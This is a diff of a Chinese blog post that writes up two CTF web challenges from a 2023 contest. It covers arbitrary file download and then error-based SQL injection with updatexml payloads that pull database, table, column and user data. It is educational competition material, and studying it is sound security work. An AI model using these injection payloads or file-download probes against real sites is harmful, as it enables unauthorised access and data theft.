@@ -203,7 +203,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ff7d73">CTF线上赛</a>
+                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #00bcd4">CTF线上赛</a>
             </span>
             
         </span>
@@ -211,14 +211,21 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><span id="more"></span>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>web又爆零了555，不过这次做的两题倒是都有收获一点新的思路，直接开等wp</p>
+<p>yysy考点确实挺多的</p>
+<span id="more"></span>
 
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="CarelessPy"><a href="#CarelessPy" class="headerlink" title="CarelessPy"></a>CarelessPy</h2><p>进入题目ctrl+u</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="CarelessPy"><a href="#CarelessPy" class="headerlink" title="CarelessPy"></a>CarelessPy</h2><blockquote>
+<p>任意文件下载+pyc文件</p>
+</blockquote>
+<p>进入题目ctrl+u</p>
 <p><img src="/blog/2023/06/10/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%B2%BE%E8%8B%B1%E8%B5%9B2023/image-20230610120537716.png" alt="image-20230610120537716"></p>
 <p>发现两个路由和一个任意文件下载</p>
 <p><code>/eval</code></p>
 <p><img src="/blog/2023/06/10/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%B2%BE%E8%8B%B1%E8%B5%9B2023/image-20230610141237171.png" alt="image-20230610141237171"></p>
 <p>但是本人在做题的时候发现怎么传cmd都返回500，不知道问题在哪</p>
+<p>看了wp才突然意识到，当时页面回显的是根目录下的所有文件和文件夹</p>
+<p>也就是说我们要传入cmd的值是路径</p>
 <p><code>/login</code></p>
 <p>一个登录页面</p>
 <p>session解码一下可以发现</p>
@@ -226,7 +233,7 @@
 <p>因此需要找key</p>
 <p><code>任意文件下载/download?file=</code></p>
 <p>测试发现app.py、flag、&#x2F;proc被过滤了</p>
-<p>下载根目录下的start.sh得到</p>
+<p>下载根目录下的start.sh得到(其实这个东西好像没什么用只是忘了删而已)</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
 <span class="token function">sh</span> /flag.sh
 python <span class="token parameter variable">-m</span> py_compile /app/part.py
@@ -234,25 +241,30 @@ python /app/app.py
 <span class="token function">rm</span> <span class="token parameter variable">-f</span> /start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>同时也尝试下载&#x2F;etc&#x2F;environment和.dockerenv，但是里面都没有内容</p>
+<hr>
 <h2 id="Confronting-robot"><a href="#Confronting-robot" class="headerlink" title="Confronting robot"></a>Confronting robot</h2><blockquote>
-<p>报错注入</p>
+<p>报错注入+getshell</p>
 </blockquote>
 <p>爆数据库名</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?myname<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>得到robot_data</p>
 <p>爆表名</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?myname<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span>robot_data'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>得到name</p>
 <p>爆列名</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?myname<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='</span>name'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>得到username</p>
 <p>爆字段名</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?myname<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token keyword">from</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>发现有位数限制</p>
+<p>发现有位数限制，用<code>substr()</code>读取</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?myname<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token keyword">from</span> name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>得到<code>/sEcR@t_n@Bodyknow.php</code></p>
+<p>然后来到这个页面，卡在执行命令上。。。</p>
 
     </div>
     
